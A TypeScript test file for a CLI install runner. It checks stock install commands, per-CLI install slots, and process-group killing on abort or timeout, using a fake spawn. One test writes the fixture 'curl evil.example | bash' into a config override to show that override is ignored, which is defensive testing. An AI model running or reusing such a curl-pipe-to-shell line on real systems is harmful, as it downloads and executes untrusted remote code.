/**
 * @fileoverview The shared runner of a stock CLI's install command (src/cli-install-runner.ts):
 * what is new in it since it left the registry route, and what both of its callers rely on.
 *
 * The route's own behaviour (answers, audit entry, environment, timeout) stays pinned by
 * test/routes/cli-registry-routes.test.ts, which runs unchanged against the moved code. Here:
 *  - `stockInstallCommand()` reads the COMPILED stock entry, so a `clis.json` override cannot
 *    change what the local model install job runs;
 *  - the one install slot per CLI is shared: while the job holds it, the route answers 409;
 *  - an abort signal kills the installer's process group, and one that is already aborted
 *    starts nothing;
 *  - `forgetResolvedCli()` drops both caches.
 *
 * Nothing is really spawned: `spawn` is a fake child.
 *
 * Port: N/A (app.inject(), no live server).
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { EventEmitter } from 'node:events';
import { mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { dirname } from 'node:path';
import { createRouteTestHarness } from './routes/_route-test-utils.js';
import {
  CLI_INSTALL_TIMEOUT_MS,
  forgetResolvedCli,
  runInstallCommand,
  stockInstallCommand,
  tryBeginCliInstall,
} from '../src/cli-install-runner.js';
import { registerCliRegistryRoutes } from '../src/web/routes/cli-registry-routes.js';
import { SETTINGS_PATH } from '../src/web/route-helpers.js';
import {
  getCli,
  registryFilePath,
  reloadCliRegistry,
  resolveInstallCommandForPlatform,
} from '../src/config/cli-registry/registry.js';
import { STOCK_CLIS } from '../src/config/cli-registry/stock.js';

const { spawnMock, invalidateBinariesSpy, invalidateIdSpy } = vi.hoisted(() => ({
  spawnMock: vi.fn(),
  invalidateBinariesSpy: vi.fn(),
  invalidateIdSpy: vi.fn(),
}));
vi.mock('node:child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:child_process')>();
  return { ...actual, spawn: spawnMock };
});
vi.mock('../src/utils/cli-executable-resolver.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/utils/cli-executable-resolver.js')>();
  return {
    ...actual,
    invalidateCliExecutableResolvers: (binaries: readonly string[]) => {
      invalidateBinariesSpy([...binaries]);
      actual.invalidateCliExecutableResolvers(binaries);
    },
  };
});
vi.mock('../src/utils/cli-resolver.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/utils/cli-resolver.js')>();
  return {
    ...actual,
    invalidateCliResolverCache: (id?: string) => {
      invalidateIdSpy(id);
      actual.invalidateCliResolverCache(id);
    },
  };
});

interface FakeChild extends EventEmitter {
  pid: number;
  stdout: EventEmitter;
  stderr: EventEmitter;
}

/** A spawned installer that stays alive until the test ends it. */
function hangingChild(pid = 4_242_424): FakeChild {
  const child = new EventEmitter() as FakeChild;
  child.pid = pid;
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();
  return child;
}

beforeEach(() => {
  spawnMock.mockReset();
  invalidateBinariesSpy.mockClear();
  invalidateIdSpy.mockClear();
});

afterEach(() => {
  vi.useRealTimers();
  vi.restoreAllMocks();
});

describe('stockInstallCommand', () => {
  afterEach(() => {
    rmSync(registryFilePath(), { force: true });
    reloadCliRegistry();
  });

  it('is the compiled stock command of every stock CLI that has one for this platform', () => {
    for (const entry of STOCK_CLIS) {
      const expected = resolveInstallCommandForPlatform(entry);
      expect(stockInstallCommand(entry.id as string)).toBe(expected && expected.trim() !== '' ? expected : undefined);
    }
    expect(stockInstallCommand('opencode')).toBe('curl -fsSL https://opencode.ai/install | bash');
  });

  it('is undefined for an id that is not a stock CLI', () => {
    expect(stockInstallCommand('not-a-cli')).toBeUndefined();
    expect(stockInstallCommand('')).toBeUndefined();
    expect(stockInstallCommand('__proto__')).toBeUndefined();
  });

  it('ignores a clis.json override: the registry shows the override, the stock command stays', () => {
    mkdirSync(dirname(registryFilePath()), { recursive: true });
    writeFileSync(
      registryFilePath(),
      JSON.stringify({
        schemaVersion: 1,
        clis: {
          opencode: {
            discovery: {
              install: { command: { linux: 'curl evil.example | bash', darwin: 'curl evil.example | bash' } },
            },
          },
        },
      }),
      { mode: 0o600 }
    );
    reloadCliRegistry();
    // The override is in force for the registry (what the Settings list shows and the route runs)...
    expect(resolveInstallCommandForPlatform(getCli('opencode')!)).toBe('curl evil.example | bash');
    // ...and is not what the local model install job would run.
    expect(stockInstallCommand('opencode')).toBe('curl -fsSL https://opencode.ai/install | bash');
  });
});

describe('tryBeginCliInstall', () => {
  it('gives one slot per CLI id, and the slot comes back when it is released', () => {
    const release = tryBeginCliInstall('slot-a');
    expect(release).toBeTypeOf('function');
    expect(tryBeginCliInstall('slot-a')).toBeNull();
    // Another CLI has its own slot.
    const other = tryBeginCliInstall('slot-b');
    expect(other).toBeTypeOf('function');
    release!();
    const again = tryBeginCliInstall('slot-a');
    expect(again).toBeTypeOf('function');
    again!();
    other!();
  });

  it('a release called twice frees the slot once: a later holder is not thrown out', () => {
    const first = tryBeginCliInstall('slot-c')!;
    first();
    const second = tryBeginCliInstall('slot-c')!;
    first();
    expect(tryBeginCliInstall('slot-c')).toBeNull();
    second();
  });

  it('is the slot the registry route uses: while it is held, POST /api/clis/:id/install answers 409 and spawns nothing', async () => {
    mkdirSync(dirname(SETTINGS_PATH), { recursive: true });
    writeFileSync(SETTINGS_PATH, JSON.stringify({ cliManagementEnabled: true }));
    const { app } = await createRouteTestHarness(registerCliRegistryRoutes);
    const release = tryBeginCliInstall('grok')!;
    try {
      const res = await app.inject({ method: 'POST', url: '/api/clis/grok/install' });
      expect(res.json()).toMatchObject({ success: false, errorCode: 'CONFLICT' });
      expect(spawnMock).not.toHaveBeenCalled();
    } finally {
      release();
    }
    // Released: the route installs again.
    spawnMock.mockImplementation(() => {
      const child = hangingChild();
      setImmediate(() => child.emit('close', 0));
      return child;
    });
    const res = await app.inject({ method: 'POST', url: '/api/clis/grok/install' });
    expect(res.json()).toMatchObject({ success: true, data: { id: 'grok', code: 0 } });
    // And the route gave the slot back when its install ended.
    const after = tryBeginCliInstall('grok');
    expect(after).toBeTypeOf('function');
    after!();
  });
});

describe('runInstallCommand', () => {
  it('runs the command in a shell of its own process group and reports how it ended', async () => {
    spawnMock.mockImplementation(() => {
      const child = hangingChild();
      setImmediate(() => {
        child.stdout.emit('data', Buffer.from('installed\n'));
        child.emit('close', 0);
      });
      return child;
    });
    const result = await runInstallCommand('echo hello');
    expect(result).toEqual({ code: 0, output: 'installed\n', timedOut: false, aborted: false });
    expect(spawnMock).toHaveBeenCalledTimes(1);
    expect(spawnMock.mock.calls[0][0]).toBe('echo hello');
    expect(spawnMock.mock.calls[0][1]).toMatchObject({ shell: true, detached: true });
  });

  it('a spawn that throws is a result, not an exception', async () => {
    spawnMock.mockImplementation(() => {
      throw new Error('ENOENT sh');
    });
    expect(await runInstallCommand('echo hello')).toEqual({
      code: null,
      output: 'spawn failed: ENOENT sh',
      timedOut: false,
      aborted: false,
    });
  });

  it('a signal that is already aborted starts nothing', async () => {
    const controller = new AbortController();
    controller.abort();
    expect(await runInstallCommand('echo hello', { signal: controller.signal })).toEqual({
      code: null,
      output: '',
      timedOut: false,
      aborted: true,
    });
    expect(spawnMock).not.toHaveBeenCalled();
  });

  it('an abort kills the whole process group: SIGTERM at once, SIGKILL three seconds later', async () => {
    vi.useFakeTimers();
    const kill = vi.spyOn(process, 'kill').mockImplementation(() => true);
    const child = hangingChild(777_777);
    spawnMock.mockImplementation(() => child);
    const controller = new AbortController();
    const pending = runInstallCommand('echo hello', { signal: controller.signal });
    await vi.waitFor(() => expect(spawnMock).toHaveBeenCalledTimes(1));

    controller.abort();
    // The negative pid is the group: the installer's own children go with it.
    expect(kill).toHaveBeenCalledWith(-777_777, 'SIGTERM');
    expect(kill).not.toHaveBeenCalledWith(-777_777, 'SIGKILL');
    await vi.advanceTimersByTimeAsync(3_000);
    expect(kill).toHaveBeenCalledWith(-777_777, 'SIGKILL');

    child.emit('close', null);
    expect(await pending).toEqual({ code: null, output: '', timedOut: false, aborted: true });
  });

  it('an aborted installer that never closes is given up on after eight seconds', async () => {
    vi.useFakeTimers();
    vi.spyOn(process, 'kill').mockImplementation(() => true);
    spawnMock.mockImplementation(() => hangingChild());
    const controller = new AbortController();
    const pending = runInstallCommand('echo hello', { signal: controller.signal });
    await vi.waitFor(() => expect(spawnMock).toHaveBeenCalledTimes(1));
    controller.abort();
    await vi.advanceTimersByTimeAsync(8_000);
    expect(await pending).toMatchObject({ code: null, aborted: true, timedOut: false });
  });

  it('the timeout still kills the group and says so, as it did in the route', async () => {
    vi.useFakeTimers();
    const kill = vi.spyOn(process, 'kill').mockImplementation(() => true);
    const child = hangingChild(888_888);
    spawnMock.mockImplementation(() => child);
    const pending = runInstallCommand('echo hello');
    await vi.waitFor(() => expect(spawnMock).toHaveBeenCalledTimes(1));
    await vi.advanceTimersByTimeAsync(CLI_INSTALL_TIMEOUT_MS);
    expect(kill).toHaveBeenCalledWith(-888_888, 'SIGTERM');
    child.emit('close', null);
    expect(await pending).toEqual({ code: null, output: '', timedOut: true, aborted: false });
  });

  it('an abort after the installer ended does nothing', async () => {
    const kill = vi.spyOn(process, 'kill').mockImplementation(() => true);
    spawnMock.mockImplementation(() => {
      const child = hangingChild();
      setImmediate(() => child.emit('close', 0));
      return child;
    });
    const controller = new AbortController();
    const result = await runInstallCommand('echo hello', { signal: controller.signal });
    controller.abort();
    expect(result.aborted).toBe(false);
    expect(kill).not.toHaveBeenCalled();
  });
});

describe('forgetResolvedCli', () => {
  it('drops the per-binary caches and the per-id resolver', () => {
    forgetResolvedCli('opencode', ['opencode', 'opencode-bin']);
    expect(invalidateBinariesSpy).toHaveBeenCalledWith(['opencode', 'opencode-bin']);
    expect(invalidateIdSpy).toHaveBeenCalledWith('opencode');
  });
});
